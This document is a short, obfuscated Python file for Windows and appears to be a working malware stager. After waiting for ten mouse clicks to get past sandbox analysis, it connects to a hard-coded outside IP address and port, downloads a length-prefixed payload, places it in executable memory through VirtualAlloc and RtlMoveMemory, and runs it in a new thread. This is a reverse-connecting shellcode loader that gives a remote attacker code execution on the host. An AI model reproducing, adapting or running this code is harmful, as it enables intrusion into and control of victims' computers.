import struct, socket, binascii, ctypes as jSmQpo, random, time
import win32api
SwtkhT = 0
HATImQtdT = 10
while SwtkhT < HATImQtdT:
	xLzylFUcMlz = win32api.GetAsyncKeyState(1)
	EZjpSwPQqEK = win32api.GetAsyncKeyState(2)
	if xLzylFUcMlz % 2 == 1:
		SwtkhT += 1
	if EZjpSwPQqEK % 2 == 1:
		SwtkhT += 1
if SwtkhT >= HATImQtdT:
	JQJwWhoBKH, ogwbHaVqXr = None, None
	def MgdtlbQYV():
		try:
			global ogwbHaVqXr
			ogwbHaVqXr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			ogwbHaVqXr.connect(('147.185.221.30', 41697))
			pSaLyLCGncbpuz = struct.pack('<i', ogwbHaVqXr.fileno())
			l = struct.unpack('<i', ogwbHaVqXr.recv(4))[0]
			nlLEgbvM = b"     "
			while len(nlLEgbvM) < l: nlLEgbvM += ogwbHaVqXr.recv(l)
			Cigqdb = jSmQpo.create_string_buffer(nlLEgbvM, len(nlLEgbvM))
			Cigqdb[0] = binascii.unhexlify('BF')
			for i in range(4): Cigqdb[i+1] = pSaLyLCGncbpuz[i]
			return Cigqdb
		except: return None
	def wQnaRT(QAkfgLrxCBWrvCF):
		if QAkfgLrxCBWrvCF != None:
			MSCxmGqkIdsJ = bytearray(QAkfgLrxCBWrvCF)
		xoMdeFVyG = jSmQpo.windll.kernel32.VirtualAlloc(jSmQpo.c_int(0),jSmQpo.c_int(len(MSCxmGqkIdsJ)),jSmQpo.c_int(0x3000),jSmQpo.c_int(0x40))
		YssmzAkixNmgZXZ = (jSmQpo.c_char * len(MSCxmGqkIdsJ)).from_buffer(MSCxmGqkIdsJ)
		jSmQpo.windll.kernel32.RtlMoveMemory(jSmQpo.c_int(xoMdeFVyG), YssmzAkixNmgZXZ, jSmQpo.c_int(len(MSCxmGqkIdsJ)))
		ht = jSmQpo.windll.kernel32.CreateThread(jSmQpo.c_int(0),jSmQpo.c_int(0),jSmQpo.c_int(xoMdeFVyG),jSmQpo.c_int(0),jSmQpo.c_int(0),jSmQpo.pointer(jSmQpo.c_int(0)))
		jSmQpo.windll.kernel32.WaitForSingleObject(jSmQpo.c_int(ht),jSmQpo.c_int(-1))
	JQJwWhoBKH = MgdtlbQYV()
	wQnaRT(JQJwWhoBKH)
